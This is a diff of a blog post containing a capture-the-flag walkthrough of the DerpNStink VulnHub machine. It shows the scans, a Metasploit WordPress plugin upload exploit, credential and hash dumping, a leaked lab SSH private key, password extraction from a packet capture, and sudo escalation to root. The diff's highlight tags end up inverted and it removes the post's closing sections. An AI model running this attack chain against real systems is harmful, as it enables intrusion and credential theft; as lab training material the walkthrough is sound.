@@ -36,7 +36,8 @@ After all the fun I've had doing vulnhub boxes with my friends, I wanted to try 
 
 This is a beginner level vulnerable machine, so an nmap scan was pretty sparse. No surprises here. I ended up using all three of the available services to capture the available flags on this machine.
 
-```
+{{< highlight markdown >}}
+
 msf5 > db_nmap -sV -O -A -p- -T5 target
 [*] Nmap: Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-07 00:05 EDT
 [*] Nmap: Nmap scan report for target (192.168.167.145)
@@ -68,17 +69,20 @@ msf5 > db_nmap -sV -O -A -p- -T5 target
 [*] Nmap: 1   0.81 ms derpstink (192.168.167.145)
 [*] Nmap: OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 [*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 13.65 seconds
-```
+
+{{< / highlight >}}
 
 ## HTTP
 
 Since anonymous ftp didn't turn up anything, and we need to have creds for SSH, HTTP was the obvious starting point. I checked out `robots.txt`, and poked with curl. That turned up the first flag almost immediately.
 
-```
+{{< highlight markdown >}}
+
 curl target
 ...
 <--flag1(52E37291AEDF6A46D7D0BB8A6312F4F9F1AA4975C248C3F0E008CBA09D6E9166) -->
-```
+
+{{< / highlight >}}
 
 While that was encouraging, I figured it was also maybe a little misleading, and that the rest would be more difficult. That turned out to be correct.
 
@@ -92,7 +96,8 @@ WPScan turned up a lot of vulnerabilities, but many required authentication. I e
 
 Since the output of WPScan can be pretty large, here's just the part I used to get a shell.
 
-```
+{{< highlight markdown >}}
+
 [+] slideshow-gallery
  | Location: http://derpnstink.local/weblog/wp-content/plugins/slideshow-gallery/
  | Last Updated: 2019-04-01T15:08:00.000Z
@@ -113,11 +118,13 @@ Since the output of WPScan can be pretty large, here's just the part I used to g
  |      - http://packetstormsecurity.com/files/131526/
  |      - https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_slideshowgallery_upload
  |
- ```
+ 
+{{< / highlight >}}
 
 Oh, look! It even has a metasploit module!
 
-```
+{{< highlight markdown >}}
+
 msf5 exploit(unix/webapp/wp_slideshowgallery_upload) > set wp_user admin                                                                                                         
 wp_user => admin                                                                                                                                                                 
 msf5 exploit(unix/webapp/wp_slideshowgallery_upload) > set wp_password admin                                                                                                     
@@ -140,7 +147,8 @@ Server username: www-data (33)
 meterpreter > ls                                                                                                                                                                 
 Listing: /var/www/html/weblog/wp-content/uploads/slideshow-gallery                                                                                                               
 ================================================================== 
-```
+
+{{< / highlight >}}
 
 My notes for `/weblog/` definitely include the word `yikes`. With the trivial effort to get a shell, I knew I was going to have to do something tricky to get the next step. Wrong. I made this part harder than it was because I missed an important detail when I tried to move too fast. Let me back up and explain properly before I repeat that mistake here!
 
@@ -148,7 +156,8 @@ My notes for `/weblog/` definitely include the word `yikes`. With the trivial ef
 
 With a shell as the `www-data` user, I could grab credentials for wordpress easily. While I was at it, I grabbed `/etc/passwd` to get a real user list.
 
-```
+{{< highlight markdown >}}
+
 www-data@DeRPnStiNK:/var/www/html/weblog$ grep -i db wp-config.php
 define('DB_NAME', 'wordpress');
 define('DB_USER', 'root');
@@ -199,11 +208,13 @@ stinky:x:1001:1001:Uncle Stinky,,,:/home/stinky:/bin/bash
 ftp:x:118:126:ftp daemon,,,:/srv/ftp:/bin/false
 mrderp:x:1000:1000:Mr. Derp,,,:/home/mrderp:/bin/bash
 www-data@DeRPnStiNK:/var/www/html/weblog$ 
-```
+
+{{< / highlight >}}
 
 Next I was able to connect to mysql and dump some passwords. Since the user/pass combo was so simple, I decided to go right for the gold and connect to mysql db directly:
 
-```
+{{< highlight markdown >}}
+
 www-data@DeRPnStiNK:/var/www/html/weblog$ mysql -uroot -pmysql mysql
 mysql> select user, host, password from user;
 +------------------+------------------+-------------------------------------------+
@@ -221,7 +232,8 @@ mysql> select user, host, password from user;
 
 Next I popped these hashes into a file for cracking:
 
-```
+
+{{< / highlight >}}
 root@kali:[~/derpnstink]: 
 [Exit: 0] 00:25: cat johnmysql.txt 
 root:*E74858DB86EBA20BC33D0AECAE8A8108C56B17FA
@@ -242,7 +254,8 @@ root:mysql
 root:mysql
 unclestinky:wedgie57
 phpmyadmin:admin
-```
+{{< highlight markdown >}}
+
 
 ## Whoops
 
@@ -258,9 +271,11 @@ I decided to check my premises. I looked for another walkthrough to get me unstu
 
 The astute reader will notice that the mysql password for `unclestinky` is already included in this post in the output from john the ripper. After grabbing it on [crackstation](https://crackstation.net/), I decided to revisit john. When I re-ran john, I saw what I had missed; it had already cracked the password I wanted. It was still running to crack a password that didn't matter:
 
-```
+
+{{< / highlight >}}
 | debian-sys-maint | localhost        | *B95758C76129F85E0D68CF79F38B66F156804E93 |
-```
+{{< highlight markdown >}}
+
 
 ## Back On Track
 
@@ -271,10 +286,12 @@ I had corrected my misstep with the help of the almighty internet and learned so
 
 Now I had the password for the only other wordpress user, which I was sure was the route to getting a foothold as a real user. I logged into wordpress as `unclestinky` and poked around; when I checked the posts section of the admin interface I found a draft called `flag.txt`
 
-```
+
+{{< / highlight >}}
 flag2(a7d355b26bda6bf1196ccffead0b2cf2b81f0a9de5b4876b44407f1dc07e51e6)
 
-```
+{{< highlight markdown >}}
+
 
 Well that's great.
 
@@ -282,7 +299,8 @@ Well that's great.
 
 Early on I grabbed the `/etc/ssh/sshd_config` file and saw that password authentication was disabled, so I knew if I could re-use this password, it would be via ftp. I also grabbed the `vsftpd` config file, and `/etc/passwd` so I knew the only user who could log in via ftp was the system user`stinky`.
 
-```
+
+{{< / highlight >}}
 www-data@DeRPnStiNK:/var/www/html/weblog/wp-content/uploads/slideshow-gallery$ cat /etc/vsftpd.conf | grep -vP '^$|^#'
 listen=YES
 anonymous_enable=yes
@@ -307,11 +325,13 @@ www-data@DeRPnStiNK:/var/www/html/weblog/wp-content/uploads/slideshow-gallery$
 
 www-data@DeRPnStiNK:/var/www/html/weblog/wp-content/uploads/slideshow-gallery$ cat /etc/vsftpd.userlist
 stinky
-```
+{{< highlight markdown >}}
+
 
 Here's the loot from `stinky`'s ftp access:
 
-```
+
+{{< / highlight >}}
 # from lftp I cat the file:
 ...
 <--- 150 Opening BINARY mode data connection for network-logs/derpissues.txt ...
@@ -362,7 +382,8 @@ UBtPqkw0sAptqkjKeNtLCYtHNFJAnE0/uAGoAyX+SHhas0l2IYlUlk8AttcHP1kA
 a4Id4FlCiJAXl3/ayyrUghuWWA3jMW3JgZdMyhU3OV+wyZz25S8o
 -----END RSA PRIVATE KEY-----
 1675 bytes transferred                  
-```
+{{< highlight markdown >}}
+
 
 ## SSH
 
@@ -370,7 +391,8 @@ a4Id4FlCiJAXl3/ayyrUghuWWA3jMW3JgZdMyhU3OV+wyZz25S8o
 
 The next step was to connect with the ssh key I found as the user `stinky` and see what else I could grab. Oh, look, a flag!
 
-```
+
+{{< / highlight >}}
 root@kali:[~/derpnstink]:                                                                                                                                                         
 [Exit: 0] 00:25: ssh -i stinky.key stinky@target                                                                                                                                  
                                                                                                                                                                                   
@@ -418,11 +440,13 @@ flag3(07f62b021771d3cf67e2e1faf18769cc5e5c119ad7d4d1847a11e11d6d5a7ecb)
 stinky@DeRPnStiNK:~$ ls -r Documents/
 derpissues.pcap
 stinky@DeRPnStiNK:~$ 
-```
+{{< highlight markdown >}}
+
 
 More important than the flag, I found the pcap that was referred to in the chat log I found via ftp. I grabbed that and did a very lazy parse. Oh, look, a password!
 
-```
+
+{{< / highlight >}}
 scp -i stinky.key stinky@target:~/Documents/derpissues.pcap .
 # get password for mrderp from pcap ; pass is reused in system and wordpress:
 tshark -r derpissues.pcap -2 -Y http -V  | grep -i pass
@@ -436,13 +460,15 @@ Running as user "root" and group "root". This could be dangerous.
     Form item: "pass2" = "derpderpderpderpderpderpderp"
         Key: pass2
 ...
-```
+{{< highlight markdown >}}
+
 
 ### MrDerp
 
 Since password auth is disallowed in `sshd_config`, I just did a `su - mrderp` from my shell as `stinky`. I used the password from the packet capture, and was authenticated.
 
-```
+
+{{< / highlight >}}
 stinky@DeRPnStiNK:~$ su - mrderp
 Password:
 mrderp@DeRPnStiNK:~$ ls                                                              
@@ -455,11 +481,13 @@ From: Help Desk <helpdesk@derpnstink.local>
 Date: Thu, Aug 23, 2017 at 1:29 PM
 Subject: sudoers ISSUE=242 PROJ=26
 ...
-```
+{{< highlight markdown >}}
+
 
 Based on the hint in the helpdesk log, I went straight to looking at `sudo`.
 
-```
+
+{{< / highlight >}}
 mrderp@DeRPnStiNK:~/Desktop$ sudo -l
 [sudo] password for mrderp:
 Matching Defaults entries for mrderp on DeRPnStiNK:
@@ -478,50 +506,12 @@ mrderp@DeRPnStiNK:~/binaries$ sudo ./derpy
 # and now I 'm root
 root@DeRPnStiNK:~/binaries# id
 uid=0(root) gid=0(root) groups=0(root)
-```
+{{< highlight markdown >}}
+
 
 ### Root
 
 There's not much left to do here. I poked around because I'm curious and wanted to better understand the build of this vulnerable machine. Like most of these, once you have `root`, getting the flag is trivial.
 
-```
-root@DeRPnStiNK:/root/Desktop# cat flag.txt 
-flag4(49dca65f362fee401292ed7ada96f96295eab1e589c52e4e66bf4aedda715fdd)
 
-Congrats on rooting my first VulnOS!
-
-Hit me up on twitter and let me know your thoughts!
-
-@securekomodo
-
-```
-
-## Summary
-
-I really enjoyed this machine. I got frustrated by my own mistakes along the way, but in doing so, I learned a lot, so it was still a win for me.
-
-### Key Reminders
-
-If you read this far, none of what follows should be new information.
-
-1. Never re-use passwords. It's 2019. You should be using a [password manager](https://www.reddit.com/r/AskNetsec/comments/agu6fy/what_is_the_best_password_manager_based_on_your/) and have unique, complex passwords for everything and use two factor auth whenever possible.
-2. Never ever authenticate to any service over HTTP. Even better, use something like [HTTPS everywhere](https://www.eff.org/https-everywhere) to help you be smart.
-3. Configuring `sudo` for stuff in a user's home directory or any path that is easily modifiable is a huge security hole.
-4. SSH private keys are sacred, and must be burned if compromised, or even if you _suspect_ compromise.
-
-### Test Methodology Reminders
-
-Here's some reminders for doing this kind of work.
-
-1. Be meticulous and take detailed notes. Like a million other people doing this, I like to use [cherrytree](https://www.giuspen.com/cherrytree/).
-2. Double check the front door/easy way before moving on. Remember all that time I said I wasted trying more difficult/exciting exploits that didn't pan out before realizing I missed a password I already cracked? Don't do that.
-3. When you feel stuck, or frustrated, take a break! This goes hand in hand with the last point. My mistake cascaded into a much bigger waste of time because of poor decision making; that was a result of me refusing to take a break, take a step back, and re-evaluate.
-
-## Bonus Reading
-
-One of the [kernel exploits](https://www.exploit-db.com/exploits/42276) I tried lead to a very interesting read. Qualsys write up of [stack clashing](https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt) is incredibly detailed. While I didn't understand all of it, I did learn some things while trying to read and understand it, and learning and fun is the whole point of this activity. I also have found myself referring to this [gitbook on privilege escalation](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html) again and again. It's a very useful resource. Here's a particularly relevant piece of advice from, that gitbook:
-
-> Don't use kernel exploits if you can avoid it. If you use it it might crash the machine or put it in an unstable state. So kernel exploits should be the last resort. Always use a simpler priv-esc if you can. They can also produce a lot of stuff in the `sys.log`. So if you find anything good, put it up on your list and keep searching for other ways before exploiting it.
-
-Sage advice. I also spent some time working on [MySQL UDF exploitation](https://www.exploit-db.com/exploits/1518), which was a new concept to me. There's a [terrific writeup here](https://osandamalith.com/2018/02/11/mysql-udf-exploitation/). While it is focused on Windows, it explains the concept and process in great detail. I found out pretty quickly that `--secure-file-priv` is a showstopper for this kind of exploit unless you have access to control MySQL, or access to write to the directory specified by the variable, since it is [not dynamic](https://dev.mysql.com/doc/refman/8.0/en/server-options.html#option_mysqld_secure-file-priv). Kudos to the machine author for making the wrong path difficult, but also a learning opportunity. I got a lot more out of this machine than I expected.Thanks for reading!
-
+{{< / highlight >}}
